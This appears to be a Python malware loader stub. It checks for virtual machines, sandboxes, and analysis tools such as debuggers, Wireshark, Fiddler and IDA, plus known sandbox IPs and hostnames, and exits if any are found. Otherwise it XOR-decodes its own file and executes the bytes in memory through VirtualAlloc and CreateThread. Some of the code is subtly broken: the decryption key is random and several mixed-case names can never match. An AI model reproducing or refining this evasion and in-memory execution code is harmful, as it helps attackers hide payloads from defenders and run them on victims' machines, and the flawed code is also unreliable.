import sys
import psutil
import os
import socket
import platform
import random
import ctypes

def protection_check():
    vm_files = [
        "C:\\windows\\system32\\vmGuestLib.dll",
        "C:\\windows\\system32\\vm3dgl.dll",
        "C:\\windows\\system32\\vboxhook.dll",
        "C:\\windows\\system32\\vboxmrxnp.dll",
        "C:\\windows\\system32\\vmsrvc.dll",
        "C:\\windows\\system32\\drivers\\vmsrvc.sys"
    ]
    for file_path in vm_files:
        if os.path.exists(file_path):
            return True
    
    blacklisted_processes = [
        'vmtoolsd.exe', 'vmwaretray.exe', 'vmwareuser.exe', 'fakenet.exe', 'dumpcap.exe', 'httpdebuggerui.exe', 
        'wireshark.exe', 'fiddler.exe', 'vboxservice.exe', 'df5serv.exe', 'vboxtray.exe', 'vmwaretray.exe', 
        'ida64.exe', 'ollydbg.exe', 'pestudio.exe', 'vgauthservice.exe', 'vmacthlp.exe', 'x96dbg.exe', 
        'x32dbg.exe', 'prl_cc.exe', 'prl_tools.exe', 'xenservice.exe', 'qemu-ga.exe', 'joeboxcontrol.exe', 
        'ksdumperclient.exe', 'ksdumper.exe', 'joeboxserver.exe', 'watcher.exe', 'mitmdump.exe', 'mitmproxy.exe', 
        'mitmweb.exe', 'Insomnia.exe', 'HTTP Toolkit.exe', 'Charles.exe', 'Postman.exe', 'BurpSuiteCommunity.exe', 
        'Fiddler Everywhere.exe', 'Fiddler.WebUi.exe', 'HTTPDebuggerUI.exe', 'HTTPDebuggerSvc.exe', 'HTTPDebuggerPro.exe', 
        'x64dbg.exe', 'Ida.exe', 'Ida64.exe', 'Progress Telerik Fiddler Web Debugger.exe', 'HTTP Debugger Pro.exe', 
        'Fiddler.exe', 'KsDumperClient.exe', 'KsDumper.exe', 'FolderChangesView.exe', 'BinaryNinja.exe', 'Cheat Engine 6.8.exe', 
        'Cheat Engine 6.9.exe', 'Cheat Engine 7.0.exe', 'Cheat Engine 7.1.exe', 'Cheat Engine 7.2.exe', 'OllyDbg.exe', 'Wireshark.exe'
    ]
    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'].lower() in blacklisted_processes:
            return True
    
    if any(ip in get_local_ips() for ip in get_blacklisted_ips()) \
            or any(hostname.lower() in get_blacklisted_hostnames() for hostname in get_local_hostnames()) \
            or platform.platform() in get_blacklisted_os() \
            or any(process.info['name'].lower() in get_blacklisted_processes() for process in psutil.process_iter()):
        return True

    return False

def get_local_ips():
    local_ips = []
    for interface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == socket.AF_INET:
                local_ips.append(addr.address)
    return local_ips

def get_local_hostnames():
    return socket.gethostbyname_ex(socket.gethostname())[0]

def get_blacklisted_ips():
    return [
        "88.132.231.71", "212.119.227.165", "52.251.116.35", "194.154.78.69", "194.154.78.137", "213.33.190.219",
        "78.139.8.50", "20.99.160.173", "88.153.199.169", "84.147.62.12", "194.154.78.160", "92.211.109.160",
        "195.74.76.222", "188.105.91.116", "34.105.183.68", "92.211.55.199", "79.104.209.33", "95.25.204.90",
        "34.145.89.174", "109.74.154.90", "109.145.173.169", "34.141.146.114", "212.119.227.151", "195.239.51.59",
        "192.40.57.234", "64.124.12.162", "34.142.74.220", "188.105.91.173", "109.74.154.91", "34.105.72.241",
        "109.74.154.92", "213.33.142.50"
    ]

def get_blacklisted_hostnames():
    return [
        "BEE7370C-8C0C-4", "AppOnFly-VPS", "tVaUeNrRraoKwa", "vboxuser", "fv-az269-80", "DESKTOP-Z7LUJHJ",
        "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4",
        "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC",
        "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4",
        "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC",
        "JULIA-PC", "d1bnJkfVlH"
    ]

def get_blacklisted_os():
    return [
        "Windows Server 2022 Datacenter", "Windows Server 2019 Standard", "Windows Server 2019 Datacenter",
        "Windows Server 2016 Standard", "Windows Server 2016 Datacenter"
    ]

def get_blacklisted_processes():
    return [
        "watcher.exe", "mitmdump.exe", "mitmproxy.exe", "mitmweb.exe", "Insomnia.exe", "HTTP Toolkit.exe",
        "Charles.exe", "Postman.exe", "BurpSuiteCommunity.exe", "Fiddler Everywhere.exe", "Fiddler.WebUi.exe",
        "HTTPDebuggerUI.exe", "HTTPDebuggerSvc.exe", "HTTPDebuggerPro.exe", "x64dbg.exe", "Ida.exe", "Ida64.exe",
        "Progress Telerik Fiddler Web Debugger.exe", "HTTP Debugger Pro.exe", "Fiddler.exe", "KsDumperClient.exe",
        "KsDumper.exe", "FolderChangesView.exe", "BinaryNinja.exe", "Cheat Engine 6.8.exe", "Cheat Engine 6.9.exe",
        "Cheat Engine 7.0.exe", "Cheat Engine 7.1.exe", "Cheat Engine 7.2.exe", "OllyDbg.exe", "Wireshark.exe"
    ]

def fake_mutex_code(exe_name: str) -> bool:
    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'].lower() == exe_name:
            return True
    return False

def decrypt_exe():
    with open(sys.argv[0], 'rb') as f:
        data = bytearray(f.read())

    key = random.randint(0, 255)
    decrypted_data = bytearray([byte ^ key for byte in data])

    kernel32 = ctypes.WinDLL('kernel32')
    process = kernel32.VirtualAlloc(kernel32.GetModuleHandleW(None), len(decrypted_data), 0x3000, 0x40)
    kernel32.VirtualProtect(process, len(decrypted_data), 0x40, ctypes.byref(ctypes.c_ulong()))
    ctypes.memmove(process, decrypted_data, len(decrypted_data))
    kernel32.CreateThread(0, 0, process, 0, 0, 0)
    return 0

if __name__ == "__main__":
    
    if protection_check():
        sys.exit(0)  
    
    decrypt_exe()  
